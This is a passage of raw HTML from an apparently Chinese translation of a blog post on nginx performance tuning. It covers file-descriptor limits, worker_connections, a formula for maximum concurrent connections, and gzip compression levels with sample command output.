title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nulimit -Sn      # soft limit\r\nulimit -Hn      # hard limit</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d320040523001-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d320040523001-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d320040523001-1\"><span class=\"crayon-i\">ulimit</span> <span class=\"crayon-o\">-</span><span class=\"crayon-i\">Sn</span>      <span class=\"crayon-p\"># soft limit</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d320040523001-2\"><span class=\"crayon-i\">ulimit</span> <span class=\"crayon-o\">-</span><span class=\"crayon-i\">Hn</span>      <span class=\"crayon-p\"># hard limit</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这个系统限制必须根据 worker_connections 进行调整。任何传入的连接都会打开至少一个文件（通常是两个连接套接字以及后端连接套接字或磁盘上的静态文件）。所以这个值等于 worker_connections*2 是安全的。幸运的是，Nginx 提供了一个配置选项来增加这个系统的值。要使用这个配置，请添加具有适当数目的 worker_rlimit_nofile 指令并重新加载 nginx。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d323217781544\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nworker_rlimit_nofile 2048;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d323217781544-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d323217781544-1\"><span class=\"crayon-v\">worker_rlimit</span><span class=\"crayon-sy\">_</span>nofile <span class=\"crayon-cn\">2048</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3>配置</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d327900523924\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nworker_process auto;\r\nworker_rlimit_nofile 2048; # Changes the limit on the maximum number of open files (RLIMIT_NOFILE) for worker processes.\r\nworker_connections 1024;   # Sets the maximum number of simultaneous connections that can be opened by a worker process.</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d327900523924-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d327900523924-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d327900523924-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d327900523924-1\"><span class=\"crayon-v\">worker</span><span class=\"crayon-sy\">_</span>process <span class=\"crayon-v\">auto</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d327900523924-2\"><span class=\"crayon-v\">worker_rlimit</span><span class=\"crayon-sy\">_</span>nofile <span class=\"crayon-cn\">2048</span><span class=\"crayon-sy\">;</span> <span class=\"crayon-p\"># Changes the limit on the maximum number of open files (RLIMIT_NOFILE) for worker processes.</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d327900523924-3\"><span class=\"crayon-v\">worker</span><span class=\"crayon-sy\">_</span>connections <span class=\"crayon-cn\">1024</span><span class=\"crayon-sy\">;</span>   <span class=\"crayon-p\"># Sets the maximum number of simultaneous connections that can be opened by a worker process.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n<h3>最大连接数</h3>\n<p>如上所述，我们可以计算一次可以处理多少个并发连接：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d32a516840424\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n最大连接数 = \r\n\r\n    worker_processes * worker_connections\r\n----------------------------------------------\r\n (keep_alive_timeout + avg_response_time) * 2</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d32a516840424-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d32a516840424-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d32a516840424-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d32a516840424-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d32a516840424-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d32a516840424-1\">最大连接数 <span class=\"crayon-o\">=</span> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d32a516840424-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f29791d32a516840424-3\">    <span class=\"crayon-v\">worker</span><span class=\"crayon-sy\">_</span>processes <span class=\"crayon-o\">*</span> <span class=\"crayon-v\">worker_connections</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d32a516840424-4\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d32a516840424-5\"> <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">keep_alive</span><span class=\"crayon-sy\">_</span>timeout <span class=\"crayon-o\">+</span> <span class=\"crayon-v\">avg_response_time</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-o\">*</span> <span class=\"crayon-cn\">2</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>keep_alive_timeout (后续有更多介绍) + avg_response_time 告诉我们：单个连接持续了多久。我们也除以 2，通常情况下，你将有一个客户端打开 2 个连接的情况：一个在 nginx 和客户端之间，另一个在 nginx 和上游服务器之间。</p>\n<h2>Gzip</h2>\n<p>启用 gzip 可以显著降低响应的（报文）大小，因此，客户端（网页）会显得更快些。</p>\n<h3>压缩级别</h3>\n<p>Gzip 有不同的压缩级别，1 到 9 级。递增这个级别将会减少文件的大小，但也会增加资源消耗。作为标准我们将这个数字（级别）保持在 3 – 5 级，就像上面说的那样，它将会得到较小的节省，同时也会得到更大的 CPU 使用率。</p>\n<p>这有个通过 gzip 的不同的压缩级别压缩文件的例子，0 代表未压缩文件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d32e905480032\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncurl -I -H 'Accept-Encoding: gzip,deflate' https://netguru.co/</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d32e905480032-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d32e905480032-1\"><span class=\"crayon-i\">curl</span> <span class=\"crayon-o\">-</span><span class=\"crayon-i\">I</span> <span class=\"crayon-o\">-</span><span class=\"crayon-i\">H</span> <span class=\"crayon-s\">'Accept-Encoding: gzip,deflate'</span> <span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//netguru.co/</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d331572481144\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n❯ du -sh ./*\r\n 64K    ./0_gzip\r\n 16K    ./1_gzip\r\n 12K    ./2_gzip\r\n 12K    ./3_gzip\r\n 12K    ./4_gzip\r\n 12K    ./5_gzip\r\n 12K    ./6_gzip\r\n 12K    ./7_gzip\r\n 12K    ./8_gzip\r\n 12K    ./9_gzip</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d331572481144-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d331572481144-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d331572481144-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d331572481144-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d331572481144-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d331572481144-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d331572481144-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d331572481144-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d331572481144-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d331572481144-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d331572481144-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d331572481144-1\">❯ <span class=\"crayon-i\">du</span> <span class=\"crayon-o\">-</span><span class=\"crayon-i\">sh</span> <span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">*</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d331572481144-2\"> <span class=\"crayon-cn\">64K</span>    <span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0_gzip</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d331572481144-3\"> <span class=\"crayon-cn\">16K</span>    <span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1_gzip</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d331572481144-4\"> <span class=\"crayon-cn\">12K</span>    <span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2_gzip</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d331572481144-5\"> <span class=\"crayon-cn\">12K</span>    <span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">3_gzip</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d331572481144-6\"> <span class=\"crayon-cn\">12K</span>    <span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">4_gzip</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d331572481144-7\"> <span class=\"crayon-cn\">12K</span>    <span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5_gzip</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d331572481144-8\"> <span class=\"crayon-cn\">12K</span>    <span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">6_gzip</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d331572481144-9\"> <span class=\"crayon-cn\">12K</span>    <span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">7_gzip</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d331572481144-10\"> <span class=\"crayon-cn\">12K</span>    <span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">8_gzip</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d331572481144-11\"> <span class=\"crayon-cn\">12K</span>    <span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">9_gzip</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d334645307891\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n❯ ls -al\r\n-rw-r--r--   1 matDobek  staff  61711  3 Nov 08:46 0_gzip\r\n-rw-r--r--   1 matDobek  staff  12331  3 Nov 08:48 1_gzip\r\n-rw-r--r--   1 matDobek  staff  12123  3 Nov 08:48 2_gzip\r\n-rw-r--r--   1 matDobek  staff  12003  3 Nov 08:48 3_gzip\r\n-rw-r--r--   1 matDobek  staff  11264  3 Nov 08:49 4_gzip\r\n-rw-r--r--   1 matDobek  staff  11111  3 Nov 08:50 5_gzip\r\n-rw-r--r--   1 matDobek  staff  11097  3 Nov 08:50 6_gzip\r\n-rw-r--r--   1 matDobek  staff  11080  3 Nov 08:50 7_gzip\r\n-rw-r--r--   1 matDobek  staff  11071  3 Nov 08:51 8_gzip\r\n-rw-r--r--   1 matDobek  staff  11005  3 Nov 08:51 9_gzip</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d334645307891-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d334645307891-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d334645307891-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d334645307891-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d334645307891-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d334645307891-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d334645307891-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d334645307891-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d334645307891-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d334645307891-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d334645307891-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d334645307891-1\">❯ <span class=\"crayon-i\">ls</span> <span class=\"crayon-o\">-</span><span class=\"crayon-v\">al</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d334645307891-2\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span>   <span class=\"crayon-cn\">1</span> <span class=\"crayon-i\">matDobek</span>  <span class=\"crayon-i\">staff</span>  <span class=\"crayon-cn\">61711</span>  <span class=\"crayon-cn\">3</span> <span class=\"crayon-i\">Nov</span> <span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">46</span> <span class=\"crayon-cn\">0_gzip</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d334645307891-3\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span>   <span class=\"crayon-cn\">1</span> <span class=\"crayon-i\">matDobek</span>  <span 